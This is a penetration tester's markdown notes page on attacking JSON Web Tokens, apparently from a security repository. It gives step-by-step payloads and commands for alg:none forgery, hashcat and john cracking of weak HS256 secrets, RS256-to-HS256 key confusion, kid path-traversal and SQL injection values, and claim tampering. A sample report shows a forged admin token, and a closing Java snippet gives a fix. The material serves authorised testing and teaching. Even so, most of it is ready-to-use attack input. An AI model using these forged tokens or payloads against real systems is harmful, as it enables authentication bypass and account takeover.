# JWT Attacks — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** Authentication Failures — OWASP A07:2021
>
> **Severity:** High to Critical — authentication bypass, privilege escalation, full account takeover
>
> **Real-world impact:** JWT vulnerabilities are consistently High to Critical findings because they target the core authentication mechanism. A single JWT weakness can compromise every user account in the application without knowing any password. Enterprise applications that migrated from session-based auth to JWT often carried implementation flaws — particularly weak secrets and missing server-side validation — from their early JWT adoption.

---

## 📖 JWT Fundamentals

```
JWT structure — 3 Base64url-encoded parts separated by dots:

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9    ← Header
.eyJ1c2VyIjoiZGhlZXJhaiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzE0OTA5MjAwfQ
                                          ← Payload (claims)
.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
                                          ← Signature

Decoded Header:  {"alg": "HS256", "typ": "JWT"}
Decoded Payload: {"user": "dheeraj", "role": "user", "exp": 1714909200}
Signature:       HMAC-SHA256(base64url(header) + "." + base64url(payload), secret)

The signature is what makes JWT secure — IF it is correctly validated.
All JWT attacks exploit failures in signature creation or validation.
```

---

## 💥 Phase 2 — Attack Vectors

### Attack 1 — Algorithm None (alg:none)

The most classic JWT vulnerability. Tell the server to use no algorithm — remove the signature entirely.

```
Step 1: Decode the JWT header
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
  → {"alg": "HS256", "typ": "JWT"}

Step 2: Modify header to set algorithm to none
  {"alg": "none", "typ": "JWT"}
  → Base64url encode: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

Step 3: Modify payload to escalate privileges
  {"user": "dheeraj", "role": "admin", "exp": 9999999999}
  → Base64url encode: eyJ1c2VyIjoiZGhlZXJhaiIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0

Step 4: Construct the token with empty signature
  new_header.new_payload.    ← trailing dot, empty signature

Step 5: Send in Authorization header:
  Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZGhlZXJhaiIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.

Also try:
  "alg": "NONE"   (uppercase)
  "alg": "None"   (mixed case)
  "alg": ""       (empty string)
```

### Attack 2 — Weak Secret Brute Force (HS256)

If the algorithm is HS256 (symmetric HMAC), the secret key may be weak and crackable offline.

```
Step 1: Copy the full JWT token from Burp Suite

Step 2: Crack using hashcat:
  hashcat -a 0 -m 16500 <full_JWT> /usr/share/wordlists/rockyou.txt

  Or using john:
  john --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256 jwt.txt

Step 3: If cracked (e.g. secret = "secret123"):
  You can now sign any payload with the real secret key
  → Forge any claims: role, user_id, email, permissions

Step 4: Create a forged token with elevated privileges:
  Header: {"alg": "HS256", "typ": "JWT"}
  Payload: {"user": "admin@company.com", "role": "admin", "exp": 9999999999}
  Sign with cracked secret using jwt.io or pyjwt:

  import jwt
  token = jwt.encode({"user":"admin@company.com","role":"admin"},
                     "secret123", algorithm="HS256")

Common weak secrets found in enterprise apps:
  "secret", "password", "changeme", "jwt_secret", "jwttoken",
  app_name, company_name, "12345", "1234567890", ""
```

### Attack 3 — RS256 to HS256 Algorithm Confusion

If the server uses RS256 (asymmetric) but also accepts HS256, the public key can be used as the HMAC secret.

```
Scenario: Server signs tokens with RS256 (private key)
          Server verifies with RS256 (public key)
          Attacker switches alg to HS256 and signs with the PUBLIC key

Step 1: Obtain the server's public key
  Common locations:
  GET /api/.well-known/jwks.json   → JSON Web Key Set
  GET /.well-known/openid-configuration → OIDC discovery
  GET /api/auth/keys

Step 2: Modify the JWT header:
  {"alg": "HS256", "typ": "JWT"}   ← change RS256 to HS256

Step 3: Modify payload claims:
  {"user": "admin", "role": "admin", "exp": 9999999999}

Step 4: Sign the token using the PUBLIC KEY as the HMAC secret:
  import jwt, base64
  public_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqh..."
  token = jwt.encode(payload, public_key, algorithm="HS256")

Step 5: If server verifies HS256 using the same public key → authentication bypass
```

### Attack 4 — kid (Key ID) Injection

The `kid` parameter in the JWT header tells the server which key to use for verification. If `kid` is injectable, it can be manipulated.

```
JWT header with kid:
{"alg": "HS256", "typ": "JWT", "kid": "keys/signing-key-1.pem"}

Attack 1 — Path Traversal via kid:
{"kid": "../../../../dev/null"}
→ Server reads /dev/null as signing key = empty string
→ Sign your forged JWT with empty string "" as the HMAC secret
→ Signature verification passes

Attack 2 — SQL Injection via kid:
{"kid": "' UNION SELECT 'attacker_secret'-- -"}
→ Server executes: SELECT key FROM keys WHERE id = '' UNION SELECT 'attacker_secret'-- -
→ Returns 'attacker_secret' as the signing key
→ Sign your JWT with 'attacker_secret' → forged token accepted

Attack 3 — kid pointing to known file:
{"kid": "/etc/passwd"}
→ Server reads /etc/passwd as signing key
→ Sign JWT using /etc/passwd content as HMAC secret
→ If verification passes = complete authentication bypass
```

### Attack 5 — JWT Claim Tampering Without Signature Bypass

Even without breaking the signature, always test whether signature validation is performed at all.

```
Step 1: Decode your valid JWT payload
  {"user": "dheeraj@test.com", "role": "user", "user_id": 1099}

Step 2: Modify claims and re-encode WITHOUT changing signature:
  {"user": "admin@company.com", "role": "admin", "user_id": 1}
  → Re-encode payload (Base64url)
  → Keep original signature unchanged

Step 3: Send the modified token
  new_header.MODIFIED_payload.ORIGINAL_signature

  If 200 OK and logged in as admin = signature not validated at all!
  This is rarer but confirms completely broken JWT implementation

Step 4: Also test expiry bypass:
  Change "exp" claim to 9999999999 (year 2286)
  Keep rest of payload same
  → If accepted past original expiry = exp claim not validated
```

---

## 🛠️ Tools for JWT Testing

```
1. Burp Suite — JWT Editor Extension (from BApp Store):
   → Automatically detects JWTs in requests
   → One-click alg:none attack
   → Embedded brute force for HS256 secrets
   → Key confusion attack (RS256 → HS256)

2. jwt.io (web-based):
   → Decode and inspect any JWT
   → Modify payload in visual editor
   → Sign with custom secret
   → Best for manual analysis

3. jwt_tool (Python CLI):
   python3 jwt_tool.py <TOKEN> -t https://target.com/api/users/me
   → Automated attack suite for all common JWT vulnerabilities

4. hashcat (secret cracking):
   hashcat -a 0 -m 16500 <TOKEN> rockyou.txt
```

---

## 📋 Enterprise Pentest Report Template

**Finding Title:** JWT Algorithm Confusion — Privilege Escalation to Administrator via alg:none

**Severity:** Critical | **CVSS v3.1:** 9.8

```
Original JWT (standard user):
  Header:  {"alg":"HS256","typ":"JWT"}
  Payload: {"user":"dheeraj@test.com","role":"user","exp":1714909200}

Forged JWT (algorithm none, role=admin):
  Header:  {"alg":"none","typ":"JWT"}
  Payload: {"user":"admin@company.com","role":"admin","exp":9999999999}
  Token:   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW5AY29tcGFueS5jb20iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9.

Request with forged token:
GET /api/admin/users HTTP/1.1
Authorization: Bearer <forged_token>

Response: HTTP 200 OK — full user list returned (admin access confirmed)
```

**Remediation:**
```java
// ✅ SECURE — Explicitly specify allowed algorithm, never accept "none"
JwtParser parser = Jwts.parserBuilder()
    .setSigningKey(secretKey)
    .requireAlgorithm("HS256")          // whitelist only HS256
    .setAllowedClockSkewSeconds(30)
    .build();

try {
    Claims claims = parser.parseClaimsJws(token).getBody();
    // Validate claims server-side
    if (!"user".equals(claims.get("role")) && !"admin".equals(claims.get("role")))
        throw new SecurityException("Invalid role claim");
} catch (JwtException e) {
    throw new AuthenticationException("Invalid token");
}
```

---

## 🧭 Key Takeaways

**1. Always start with alg:none — it is still the most common critical finding.**
Despite being documented for years, JWT libraries still implement algorithm negotiation, and developers still use them without explicitly whitelisting algorithms. This is a 30-second test that returns Critical findings regularly.

**2. Weak secrets are endemic in enterprise applications that adopted JWT early.**
Early JWT tutorials used `"secret"` as the example signing key — and many developers copied it verbatim into production. Run hashcat against rockyou.txt on every HS256 JWT. A 10-minute crack that succeeds is worth more than hours of other testing.

**3. The Burp JWT Editor extension makes JWT testing 10x faster.**
Install it from the BApp Store immediately. It detects JWTs automatically, provides one-click attack buttons, and shows real-time payload editing. Manual JWT testing without it wastes time on encoding/decoding.

**4. Kid injection is underappreciated and often overlooked.**
The `kid` parameter is present in many enterprise JWT implementations for key rotation support. Most JWT security checklists miss it. A path traversal or SQL injection via `kid` gives the attacker complete control over which key the server uses for verification.

---

## 🔗 References
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [jwt.io](https://jwt.io)

---
<div align="center">

*Part of [AppSec From The Trenches](README.md) — Real notes from 5+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
